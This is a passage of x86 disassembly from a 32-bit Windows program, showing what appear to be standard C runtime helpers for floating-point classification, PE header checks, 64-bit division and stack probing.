  40e13b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40e13e:	0f b7 45 0e          	movzwl 0xe(%ebp),%eax
  40e142:	dd 45 08             	fldl   0x8(%ebp)
  40e145:	25 0f 80 00 00       	and    $0x800f,%eax
  40e14a:	dd 5d f8             	fstpl  -0x8(%ebp)
  40e14d:	8d 89 fe 03 00 00    	lea    0x3fe(%ecx),%ecx
  40e153:	c1 e1 04             	shl    $0x4,%ecx
  40e156:	0b c8                	or     %eax,%ecx
  40e158:	66 89 4d fe          	mov    %cx,-0x2(%ebp)
  40e15c:	dd 45 f8             	fldl   -0x8(%ebp)
  40e15f:	c9                   	leave
  40e160:	c3                   	ret
  40e161:	8b ff                	mov    %edi,%edi
  40e163:	55                   	push   %ebp
  40e164:	8b ec                	mov    %esp,%ebp
  40e166:	81 7d 0c 00 00 f0 7f 	cmpl   $0x7ff00000,0xc(%ebp)
  40e16d:	8b 45 08             	mov    0x8(%ebp),%eax
  40e170:	75 07                	jne    0x40e179
  40e172:	85 c0                	test   %eax,%eax
  40e174:	75 15                	jne    0x40e18b
  40e176:	40                   	inc    %eax
  40e177:	5d                   	pop    %ebp
  40e178:	c3                   	ret
  40e179:	81 7d 0c 00 00 f0 ff 	cmpl   $0xfff00000,0xc(%ebp)
  40e180:	75 09                	jne    0x40e18b
  40e182:	85 c0                	test   %eax,%eax
  40e184:	75 05                	jne    0x40e18b
  40e186:	6a 02                	push   $0x2
  40e188:	58                   	pop    %eax
  40e189:	5d                   	pop    %ebp
  40e18a:	c3                   	ret
  40e18b:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
  40e18f:	ba f8 7f 00 00       	mov    $0x7ff8,%edx
  40e194:	66 23 ca             	and    %dx,%cx
  40e197:	66 3b ca             	cmp    %dx,%cx
  40e19a:	75 04                	jne    0x40e1a0
  40e19c:	6a 03                	push   $0x3
  40e19e:	eb e8                	jmp    0x40e188
  40e1a0:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
  40e1a5:	66 3b ca             	cmp    %dx,%cx
  40e1a8:	75 11                	jne    0x40e1bb
  40e1aa:	f7 45 0c ff ff 07 00 	testl  $0x7ffff,0xc(%ebp)
  40e1b1:	75 04                	jne    0x40e1b7
  40e1b3:	85 c0                	test   %eax,%eax
  40e1b5:	74 04                	je     0x40e1bb
  40e1b7:	6a 04                	push   $0x4
  40e1b9:	eb cd                	jmp    0x40e188
  40e1bb:	33 c0                	xor    %eax,%eax
  40e1bd:	5d                   	pop    %ebp
  40e1be:	c3                   	ret
  40e1bf:	8b ff                	mov    %edi,%edi
  40e1c1:	55                   	push   %ebp
  40e1c2:	8b ec                	mov    %esp,%ebp
  40e1c4:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
  40e1c8:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
  40e1cd:	66 8b c1             	mov    %cx,%ax
  40e1d0:	66 23 c2             	and    %dx,%ax
  40e1d3:	66 3b c2             	cmp    %dx,%ax
  40e1d6:	75 33                	jne    0x40e20b
  40e1d8:	dd 45 08             	fldl   0x8(%ebp)
  40e1db:	51                   	push   %ecx
  40e1dc:	51                   	push   %ecx
  40e1dd:	dd 1c 24             	fstpl  (%esp)
  40e1e0:	e8 7c ff ff ff       	call   0x40e161
  40e1e5:	59                   	pop    %ecx
  40e1e6:	59                   	pop    %ecx
  40e1e7:	83 e8 01             	sub    $0x1,%eax
  40e1ea:	74 18                	je     0x40e204
  40e1ec:	83 e8 01             	sub    $0x1,%eax
  40e1ef:	74 0e                	je     0x40e1ff
  40e1f1:	83 e8 01             	sub    $0x1,%eax
  40e1f4:	74 05                	je     0x40e1fb
  40e1f6:	33 c0                	xor    %eax,%eax
  40e1f8:	40                   	inc    %eax
  40e1f9:	5d                   	pop    %ebp
  40e1fa:	c3                   	ret
  40e1fb:	6a 02                	push   $0x2
  40e1fd:	eb 02                	jmp    0x40e201
  40e1ff:	6a 04                	push   $0x4
  40e201:	58                   	pop    %eax
  40e202:	5d                   	pop    %ebp
  40e203:	c3                   	ret
  40e204:	b8 00 02 00 00       	mov    $0x200,%eax
  40e209:	5d                   	pop    %ebp
  40e20a:	c3                   	ret
  40e20b:	0f b7 c9             	movzwl %cx,%ecx
  40e20e:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40e214:	66 85 c0             	test   %ax,%ax
  40e217:	75 1e                	jne    0x40e237
  40e219:	f7 45 0c ff ff 0f 00 	testl  $0xfffff,0xc(%ebp)
  40e220:	75 06                	jne    0x40e228
  40e222:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40e226:	74 0f                	je     0x40e237
  40e228:	f7 d9                	neg    %ecx
  40e22a:	1b c9                	sbb    %ecx,%ecx
  40e22c:	83 e1 90             	and    $0xffffff90,%ecx
  40e22f:	8d 81 80 00 00 00    	lea    0x80(%ecx),%eax
  40e235:	5d                   	pop    %ebp
  40e236:	c3                   	ret
  40e237:	dd 45 08             	fldl   0x8(%ebp)
  40e23a:	d9 ee                	fldz
  40e23c:	da e9                	fucompp
  40e23e:	df e0                	fnstsw %ax
  40e240:	f6 c4 44             	test   $0x44,%ah
  40e243:	7a 0c                	jp     0x40e251
  40e245:	f7 d9                	neg    %ecx
  40e247:	1b c9                	sbb    %ecx,%ecx
  40e249:	83 e1 e0             	and    $0xffffffe0,%ecx
  40e24c:	8d 41 40             	lea    0x40(%ecx),%eax
  40e24f:	5d                   	pop    %ebp
  40e250:	c3                   	ret
  40e251:	f7 d9                	neg    %ecx
  40e253:	1b c9                	sbb    %ecx,%ecx
  40e255:	81 e1 08 ff ff ff    	and    $0xffffff08,%ecx
  40e25b:	8d 81 00 01 00 00    	lea    0x100(%ecx),%eax
  40e261:	5d                   	pop    %ebp
  40e262:	c3                   	ret
  40e263:	cc                   	int3
  40e264:	cc                   	int3
  40e265:	cc                   	int3
  40e266:	cc                   	int3
  40e267:	cc                   	int3
  40e268:	cc                   	int3
  40e269:	cc                   	int3
  40e26a:	cc                   	int3
  40e26b:	cc                   	int3
  40e26c:	cc                   	int3
  40e26d:	cc                   	int3
  40e26e:	cc                   	int3
  40e26f:	cc                   	int3
  40e270:	55                   	push   %ebp
  40e271:	8b ec                	mov    %esp,%ebp
  40e273:	8b 45 08             	mov    0x8(%ebp),%eax
  40e276:	33 d2                	xor    %edx,%edx
  40e278:	53                   	push   %ebx
  40e279:	56                   	push   %esi
  40e27a:	57                   	push   %edi
  40e27b:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40e27e:	03 c8                	add    %eax,%ecx
  40e280:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40e284:	0f b7 59 06          	movzwl 0x6(%ecx),%ebx
  40e288:	83 c0 18             	add    $0x18,%eax
  40e28b:	03 c1                	add    %ecx,%eax
  40e28d:	85 db                	test   %ebx,%ebx
  40e28f:	74 1b                	je     0x40e2ac
  40e291:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40e294:	8b 70 0c             	mov    0xc(%eax),%esi
  40e297:	3b fe                	cmp    %esi,%edi
  40e299:	72 09                	jb     0x40e2a4
  40e29b:	8b 48 08             	mov    0x8(%eax),%ecx
  40e29e:	03 ce                	add    %esi,%ecx
  40e2a0:	3b f9                	cmp    %ecx,%edi
  40e2a2:	72 0a                	jb     0x40e2ae
  40e2a4:	42                   	inc    %edx
  40e2a5:	83 c0 28             	add    $0x28,%eax
  40e2a8:	3b d3                	cmp    %ebx,%edx
  40e2aa:	72 e8                	jb     0x40e294
  40e2ac:	33 c0                	xor    %eax,%eax
  40e2ae:	5f                   	pop    %edi
  40e2af:	5e                   	pop    %esi
  40e2b0:	5b                   	pop    %ebx
  40e2b1:	5d                   	pop    %ebp
  40e2b2:	c3                   	ret
  40e2b3:	cc                   	int3
  40e2b4:	cc                   	int3
  40e2b5:	cc                   	int3
  40e2b6:	cc                   	int3
  40e2b7:	cc                   	int3
  40e2b8:	cc                   	int3
  40e2b9:	cc                   	int3
  40e2ba:	cc                   	int3
  40e2bb:	cc                   	int3
  40e2bc:	cc                   	int3
  40e2bd:	cc                   	int3
  40e2be:	cc                   	int3
  40e2bf:	cc                   	int3
  40e2c0:	55                   	push   %ebp
  40e2c1:	8b ec                	mov    %esp,%ebp
  40e2c3:	6a fe                	push   $0xfffffffe
  40e2c5:	68 f8 4b 41 00       	push   $0x414bf8
  40e2ca:	68 f0 46 40 00       	push   $0x4046f0
  40e2cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40e2d5:	50                   	push   %eax
  40e2d6:	83 ec 08             	sub    $0x8,%esp
  40e2d9:	53                   	push   %ebx
  40e2da:	56                   	push   %esi
  40e2db:	57                   	push   %edi
  40e2dc:	a1 04 60 41 00       	mov    0x416004,%eax
  40e2e1:	31 45 f8             	xor    %eax,-0x8(%ebp)
  40e2e4:	33 c5                	xor    %ebp,%eax
  40e2e6:	50                   	push   %eax
  40e2e7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40e2ea:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40e2f0:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40e2f3:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40e2fa:	68 00 00 40 00       	push   $0x400000
  40e2ff:	e8 7c 00 00 00       	call   0x40e380
  40e304:	83 c4 04             	add    $0x4,%esp
  40e307:	85 c0                	test   %eax,%eax
  40e309:	74 54                	je     0x40e35f
  40e30b:	8b 45 08             	mov    0x8(%ebp),%eax
  40e30e:	2d 00 00 40 00       	sub    $0x400000,%eax
  40e313:	50                   	push   %eax
  40e314:	68 00 00 40 00       	push   $0x400000
  40e319:	e8 52 ff ff ff       	call   0x40e270
  40e31e:	83 c4 08             	add    $0x8,%esp
  40e321:	85 c0                	test   %eax,%eax
  40e323:	74 3a                	je     0x40e35f
  40e325:	8b 40 24             	mov    0x24(%eax),%eax
  40e328:	c1 e8 1f             	shr    $0x1f,%eax
  40e32b:	f7 d0                	not    %eax
  40e32d:	83 e0 01             	and    $0x1,%eax
  40e330:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40e337:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40e33a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40e341:	59                   	pop    %ecx
  40e342:	5f                   	pop    %edi
  40e343:	5e                   	pop    %esi
  40e344:	5b                   	pop    %ebx
  40e345:	8b e5                	mov    %ebp,%esp
  40e347:	5d                   	pop    %ebp
  40e348:	c3                   	ret
  40e349:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40e34c:	8b 00                	mov    (%eax),%eax
  40e34e:	33 c9                	xor    %ecx,%ecx
  40e350:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  40e356:	0f 94 c1             	sete   %cl
  40e359:	8b c1                	mov    %ecx,%eax
  40e35b:	c3                   	ret
  40e35c:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40e35f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40e366:	33 c0                	xor    %eax,%eax
  40e368:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40e36b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40e372:	59                   	pop    %ecx
  40e373:	5f                   	pop    %edi
  40e374:	5e                   	pop    %esi
  40e375:	5b                   	pop    %ebx
  40e376:	8b e5                	mov    %ebp,%esp
  40e378:	5d                   	pop    %ebp
  40e379:	c3                   	ret
  40e37a:	cc                   	int3
  40e37b:	cc                   	int3
  40e37c:	cc                   	int3
  40e37d:	cc                   	int3
  40e37e:	cc                   	int3
  40e37f:	cc                   	int3
  40e380:	55                   	push   %ebp
  40e381:	8b ec                	mov    %esp,%ebp
  40e383:	8b 45 08             	mov    0x8(%ebp),%eax
  40e386:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  40e38b:	66 39 08             	cmp    %cx,(%eax)
  40e38e:	75 1d                	jne    0x40e3ad
  40e390:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40e393:	03 c8                	add    %eax,%ecx
  40e395:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  40e39b:	75 10                	jne    0x40e3ad
  40e39d:	ba 0b 01 00 00       	mov    $0x10b,%edx
  40e3a2:	33 c0                	xor    %eax,%eax
  40e3a4:	66 39 51 18          	cmp    %dx,0x18(%ecx)
  40e3a8:	0f 94 c0             	sete   %al
  40e3ab:	5d                   	pop    %ebp
  40e3ac:	c3                   	ret
  40e3ad:	33 c0                	xor    %eax,%eax
  40e3af:	5d                   	pop    %ebp
  40e3b0:	c3                   	ret
  40e3b1:	cc                   	int3
  40e3b2:	cc                   	int3
  40e3b3:	cc                   	int3
  40e3b4:	cc                   	int3
  40e3b5:	cc                   	int3
  40e3b6:	cc                   	int3
  40e3b7:	cc                   	int3
  40e3b8:	cc                   	int3
  40e3b9:	cc                   	int3
  40e3ba:	cc                   	int3
  40e3bb:	cc                   	int3
  40e3bc:	cc                   	int3
  40e3bd:	cc                   	int3
  40e3be:	cc                   	int3
  40e3bf:	cc                   	int3
  40e3c0:	57                   	push   %edi
  40e3c1:	56                   	push   %esi
  40e3c2:	53                   	push   %ebx
  40e3c3:	33 ff                	xor    %edi,%edi
  40e3c5:	8b 44 24 14          	mov    0x14(%esp),%eax
  40e3c9:	0b c0                	or     %eax,%eax
  40e3cb:	7d 14                	jge    0x40e3e1
  40e3cd:	47                   	inc    %edi
  40e3ce:	8b 54 24 10          	mov    0x10(%esp),%edx
  40e3d2:	f7 d8                	neg    %eax
  40e3d4:	f7 da                	neg    %edx
  40e3d6:	83 d8 00             	sbb    $0x0,%eax
  40e3d9:	89 44 24 14          	mov    %eax,0x14(%esp)
  40e3dd:	89 54 24 10          	mov    %edx,0x10(%esp)
  40e3e1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40e3e5:	0b c0                	or     %eax,%eax
  40e3e7:	7d 14                	jge    0x40e3fd
  40e3e9:	47                   	inc    %edi
  40e3ea:	8b 54 24 18          	mov    0x18(%esp),%edx
  40e3ee:	f7 d8                	neg    %eax
  40e3f0:	f7 da                	neg    %edx
  40e3f2:	83 d8 00             	sbb    $0x0,%eax
  40e3f5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40e3f9:	89 54 24 18          	mov    %edx,0x18(%esp)
  40e3fd:	0b c0                	or     %eax,%eax
  40e3ff:	75 18                	jne    0x40e419
  40e401:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40e405:	8b 44 24 14          	mov    0x14(%esp),%eax
  40e409:	33 d2                	xor    %edx,%edx
  40e40b:	f7 f1                	div    %ecx
  40e40d:	8b d8                	mov    %eax,%ebx
  40e40f:	8b 44 24 10          	mov    0x10(%esp),%eax
  40e413:	f7 f1                	div    %ecx
  40e415:	8b d3                	mov    %ebx,%edx
  40e417:	eb 41                	jmp    0x40e45a
  40e419:	8b d8                	mov    %eax,%ebx
  40e41b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40e41f:	8b 54 24 14          	mov    0x14(%esp),%edx
  40e423:	8b 44 24 10          	mov    0x10(%esp),%eax
  40e427:	d1 eb                	shr    $1,%ebx
  40e429:	d1 d9                	rcr    $1,%ecx
  40e42b:	d1 ea                	shr    $1,%edx
  40e42d:	d1 d8                	rcr    $1,%eax
  40e42f:	0b db                	or     %ebx,%ebx
  40e431:	75 f4                	jne    0x40e427
  40e433:	f7 f1                	div    %ecx
  40e435:	8b f0                	mov    %eax,%esi
  40e437:	f7 64 24 1c          	mull   0x1c(%esp)
  40e43b:	8b c8                	mov    %eax,%ecx
  40e43d:	8b 44 24 18          	mov    0x18(%esp),%eax
  40e441:	f7 e6                	mul    %esi
  40e443:	03 d1                	add    %ecx,%edx
  40e445:	72 0e                	jb     0x40e455
  40e447:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40e44b:	77 08                	ja     0x40e455
  40e44d:	72 07                	jb     0x40e456
  40e44f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40e453:	76 01                	jbe    0x40e456
  40e455:	4e                   	dec    %esi
  40e456:	33 d2                	xor    %edx,%edx
  40e458:	8b c6                	mov    %esi,%eax
  40e45a:	4f                   	dec    %edi
  40e45b:	75 07                	jne    0x40e464
  40e45d:	f7 da                	neg    %edx
  40e45f:	f7 d8                	neg    %eax
  40e461:	83 da 00             	sbb    $0x0,%edx
  40e464:	5b                   	pop    %ebx
  40e465:	5e                   	pop    %esi
  40e466:	5f                   	pop    %edi
  40e467:	c2 10 00             	ret    $0x10
  40e46a:	cc                   	int3
  40e46b:	cc                   	int3
  40e46c:	cc                   	int3
  40e46d:	cc                   	int3
  40e46e:	cc                   	int3
  40e46f:	cc                   	int3
  40e470:	51                   	push   %ecx
  40e471:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40e475:	2b c8                	sub    %eax,%ecx
  40e477:	83 e1 0f             	and    $0xf,%ecx
  40e47a:	03 c1                	add    %ecx,%eax
  40e47c:	1b c9                	sbb    %ecx,%ecx
  40e47e:	0b c1                	or     %ecx,%eax
  40e480:	59                   	pop    %ecx
  40e481:	e9 1a 00 00 00       	jmp    0x40e4a0
  40e486:	51                   	push   %ecx
  40e487:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40e48b:	2b c8                	sub    %eax,%ecx
  40e48d:	83 e1 07             	and    $0x7,%ecx
  40e490:	03 c1                	add    %ecx,%eax
  40e492:	1b c9                	sbb    %ecx,%ecx
  40e494:	0b c1                	or     %ecx,%eax
  40e496:	59                   	pop    %ecx
  40e497:	e9 04 00 00 00       	jmp    0x40e4a0
  40e49c:	cc                   	int3
  40e49d:	cc                   	int3
  40e49e:	cc                   	int3
  40e49f:	cc                   	int3
  40e4a0:	51                   	push   %ecx
  40e4a1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40e4a5:	2b c8                	sub    %eax,%ecx
  40e4a7:	1b c0                	sbb    %eax,%eax
  40e4a9:	f7 d0                	not    %eax
  40e4ab:	23 c8                	and    %eax,%ecx
  40e4ad:	8b c4                	mov    %esp,%eax
  40e4af:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  40e4b4:	3b c8                	cmp    %eax,%ecx
  40e4b6:	72 0a                	jb     0x40e4c2
  40e4b8:	8b c1                	mov    %ecx,%eax
  40e4ba:	59                   	pop    %ecx
  40e4bb:	94                   	xchg   %eax,%esp
  40e4bc:	8b 00                	mov    (%eax),%eax
  40e4be:	89 04 24             	mov    %eax,(%esp)
  40e4c1:	c3                   	ret
  40e4c2:	2d 00 10 00 00       	sub    $0x1000,%eax
  40e4c7:	85 00                	test   %eax,(%eax)
  40e4c9:	eb e9                	jmp    0x40e4b4
  40e4cb:	cc                   	int3
  40e4cc:	cc                   	int3
  40e4cd:	cc                   	int3
  40e4ce:	cc                   	int3
  40e4cf:	cc                   	int3
  40e4d0:	55                   	push   %ebp
  40e4d1:	8b ec                	mov    %esp,%ebp
  40e4d3:	51                   	push   %ecx
  40e4d4:	83 3d 54 6c 41 00 01 	cmpl   $0x1,0x416c54
  40e4db:	7c 66                	jl     0x40e543
  40e4dd:	81 7d 08 b4 02 00 c0 	cmpl   $0xc00002b4,0x8(%ebp)
  40e4e4:	74 09                	je     0x40e4ef
  40e4e6:	81 7d 08 b5 02 00 c0 	cmpl   $0xc00002b5,0x8(%ebp)
  40e4ed:	75 54                	jne    0x40e543
  40e4ef:	0f ae 5d fc          	stmxcsr -0x4(%ebp)
  40e4f3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e4f6:	83 f0 3f             	xor    $0x3f,%eax
  40e4f9:	a8 81                	test   $0x81,%al
  40e4fb:	74 3f                	je     0x40e53c
  40e4fd:	a9 04 02 00 00       	test   $0x204,%eax
  40e502:	75 07                	jne    0x40e50b
  40e504:	b8 8e 00 00 c0       	mov    $0xc000008e,%eax
  40e509:	c9                   	leave
  40e50a:	c3                   	ret
  40e50b:	a9 02 01 00 00       	test   $0x102,%eax
  40e510:	74 2a                	je     0x40e53c
  40e512:	a9 08 04 00 00       	test   $0x408,%eax
  40e517:	75 07                	jne    0x40e520
  40e519:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
  40e51e:	c9                   	leave
  40e51f:	c3                   	ret
  40e520:	a9 10 08 00 00       	test   $0x810,%eax
  40e525:	75 07                	jne    0x40e52e
  40e527:	b8 93 00 00 c0       	mov    $0xc0000093,%eax
  40e52c:	c9                   	leave
  40e52d:	c3                   	ret
  40e52e:	a9 20 10 00 00       	test   $0x1020,%eax
  40e533:	75 0e                	jne    0x40e543
  40e535:	b8 8f 00 00 c0       	mov    $0xc000008f,%eax
  40e53a:	c9                   	leave
  40e53b:	c3                   	ret
  40e53c:	b8 90 00 00 c0       	mov    $0xc0000090,%eax
  40e541:	c9                   	leave
  40e542:	c3                   	ret
  40e543:	8b 45 08             	mov    0x8(%ebp),%eax
  40e546:	c9                   	leave
  40e547:	c3                   	ret
